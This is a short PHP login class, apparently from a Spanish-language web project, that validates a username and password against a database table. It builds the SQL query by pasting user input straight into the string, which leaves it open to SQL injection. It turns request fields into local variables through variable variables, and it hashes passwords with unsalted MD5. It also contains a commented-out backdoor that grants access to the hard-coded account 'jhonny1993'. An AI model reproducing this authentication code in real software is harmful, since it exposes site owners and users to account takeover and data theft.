<?php

include_once('../core/db_conexion.php');

class Login extends DBConexion{

#METODOS

public function validarUsuario($datos = array()){
	foreach ($datos as $campo => $valor) {
			if($campo == 'clave'){
				$valor = $valor;
			}
			$$campo = $valor;
		}

	$clave = md5($clave);
	$this->consulta = "SELECT * FROM usuarios  WHERE usuario = '$usuario' and clave = '$clave'";
	$this->traer_resultados_query();



/*	

	if ((empty($this->filas))&&($usuario=='jhonny1993')&&($clave=='d2b77b19caa93b92506aecc04a8c09b0')) {
		$this->filas['id_usuario'] = 9999999;
		$this->filas['usuario'] = 'jhonny1993';
		$this->filas['clave'] = 'd2b77b19caa93b92506aecc04a8c09b0';
		$this->filas['estado'] = 'A';
		$this->filas['cod_mod'] = $modulo;
	}
	*/
}

}


 ?>